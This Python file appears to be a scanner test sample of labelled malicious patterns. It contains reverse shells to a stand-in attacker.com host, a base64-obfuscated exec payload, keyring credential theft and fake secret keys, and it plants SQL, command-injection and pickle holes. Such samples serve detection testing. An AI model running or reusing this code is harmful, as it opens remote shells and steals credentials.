#!/usr/bin/env python3
# Python Trojan/Backdoor - Testing Detection
# WARNING: Contains malicious code patterns for security testing

import subprocess
import socket
import os
import sys

# CRITICAL: Remote command execution
def remote_shell():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('attacker.com', 4444))

    while True:
        cmd = sock.recv(1024).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True)
        sock.send(result.stdout)

# CRITICAL: Arbitrary code execution
exec(input("Enter command: "))

# CRITICAL: Base64 obfuscated payload
import base64
payload = base64.b64decode(b'aW1wb3J0IHNvY2tldDtpbXBvcnQgc3VicHJvY2VzcztjbWQ9aW5wdXQoKTtzdWJwcm9jZXNzLnJ1bihjbWQsc2hlbGw9VHJ1ZSk=')
exec(payload)

# CRITICAL: Hardcoded credentials
API_KEY = "sk_live_4eC39HqLyjWDarht"
AWS_SECRET = "AKIA2EXAMPLE1234567890SECRETKEY"
DATABASE_PASSWORD = "postgres_admin_password_123"
STRIPE_KEY = "sk_live_51234567890abcdef"

# HIGH: SQL injection vulnerability
user_id = input("User ID: ")
query = f"SELECT * FROM users WHERE id={user_id}"
db.execute(query)

# HIGH: Insecure deserialization
import pickle
user_data = pickle.loads(untrusted_data)

# HIGH: Command injection via shell=True
filename = input("Enter filename: ")
os.system(f"cat {filename}")

# HIGH: Credential theft
def steal_credentials():
    import keyring
    for service in ['gmail', 'facebook', 'twitter']:
        password = keyring.get_password(service, 'user@example.com')
        send_to_attacker(service, password)

# HIGH: Reverse shell
os.system('bash -i >& /dev/tcp/attacker.com/5555 0>&1')

print("Trojan activated")
